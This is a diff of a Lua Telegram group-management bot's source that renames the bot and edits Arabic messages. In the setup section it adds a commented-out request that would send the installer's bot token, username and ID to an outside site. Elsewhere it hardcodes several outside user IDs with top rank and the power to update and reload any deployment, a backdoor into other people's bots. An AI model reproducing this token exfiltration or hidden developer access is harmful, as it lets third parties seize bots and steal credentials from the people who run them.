@@ -69,16 +69,16 @@ print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يو
 create_config(Token)
 end 
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
-print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل سورس الماسـه الآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
+print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل سورس الالماسـه الآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
 js = Token:match("(%d+)")
 redis:mset(
 js..":VERSION","1.0",
 js..":SUDO_ID:",SUDO_USER,
 js..":DataCenter:","Amsterdam",
 js..":UserNameBot:",BOT_User,
-js..":ApiSource","SourceAL-MaSa",
-js..":NameBot:","ماسه",
-"TH3NK_INSTALL","Yes"
+js..":ApiSource","SourceMaSa",
+js..":NameBot:","الالماسـه",
+"TH3BOSS_INSTALL","Yes"
 )
 redis:hset(js..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 info = {} 
@@ -88,12 +88,12 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-
+--https.request('https://basel50.ml/Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./MaSa/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "*اهلا بــــك  \nتفضــــــل*"
+local Text = "*منور , شكـرا لاتسخدامك سورس الالماسـه \nتفضل تحكم بالبوت*"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 local CmdRun = [[
 rm -f ./README.md
@@ -117,8 +117,8 @@ print('\27[0;33m>>'..[[
 
 
 @khl1404k 
-
-
+                
+                
 ---------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config()
@@ -157,7 +157,7 @@ print('\27[0;33m>>'..[[
 
 
 @khl1404k
-                                    
+                                                        
 -------------------------------------------------------------------
 
 ]]..'\027[0;32m'
@@ -291,20 +291,20 @@ return false
 end 
 --test
 if msg.sender_user_id_ == 1714422669 then 
-msg.TheRankCmd = 'الـعَميـر'
-msg.TheRank = 'الـعَميـر'
+msg.TheRankCmd = 'سـالِم'
+msg.TheRank = 'سـالِم'
 msg.Rank = 1
 elseif msg.sender_user_id_ == 1755055191  then 
 msg.TheRankCmd = 'الكندي'
 msg.TheRank = 'الكندي'
 msg.Rank = 1
-elseif msg.sender_user_id_ == 127952353  then 
-msg.TheRankCmd = 'عبــداللــه'
-msg.TheRank = 'عبــداللــه'
-msg.Rank = 1
 elseif msg.sender_user_id_ == 932948575  then 
-msg.TheRankCmd = 'ابــو ريــان'
-msg.TheRank = 'ابــو ريــان'
+msg.TheRankCmd = 'أبــو ريــان'
+msg.TheRank = 'أبــو ريــان'
+msg.Rank = 1
+elseif msg.sender_user_id_ == 127952353  then 
+msg.TheRankCmd = 'عبــداللـه'
+msg.TheRank = 'عبــداللـه'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(js..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
@@ -390,8 +390,8 @@ end
 if msg.content_.members_[0].id_ == our_id and redis:get(js..':WELCOME_BOT') then
 SUDO_USER = redis:hgetall(js..'username:'..SUDO_ID).username
 sendPhoto(msg.chat_id_,msg.id_,redis:get(js..':WELCOME_BOT'),[[, السلام عليكم ⌯⁞
-✶⁞ انا مجرد بوت لحمايه مجموعتك ,
--❦ قم بترقيتي مشرف ومن ثم ارسل تفعيل .
+💠⁞ انا مجرد بوت لحمايه مجموعتك ,
+-💠 قم بترقيتي مشرف ومن ثم ارسل تفعيل .
 ]])
 return false
 end
@@ -611,19 +611,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1755055191 or msg.sender_user_id_ == 932948575 or  msg.sender_user_id_ == 127952353) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1755055191 or msg.sender_user_id_ == 932948575 or msg.sender_user_id_ == 127952353) then
 return sendMsg(msg.chat_id_,msg.id_," تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1755055191 or msg.sender_user_id_ == 932948575 or  msg.sender_user_id_ == 127952353) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1755055191 or msg.sender_user_id_ == 932948575 or msg.sender_user_id_ == 127952353) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,' {* تــم تحديث وتثبيت السورس  *} .\n\n { Bot is Update » }',function(arg,data)
 dofile("./MaSa/Run.lua")
 print("Reload ~ ./MaSa/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1755055191 or msg.sender_user_id_ == 932948575 or  msg.sender_user_id_ == 127952353) then
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1755055191 or msg.sender_user_id_ == 932948575 or msg.sender_user_id_ == 127952353) then
 sendMsg(msg.chat_id_,msg.id_,' {* تــم أعـاده تشغيل البوت  *} .\n\n| { Bot is Reloaded » }',function(arg,data)
 dofile("./MaSa/Run.lua")
 print("Reload ~ ./MaSa/Run.lua")
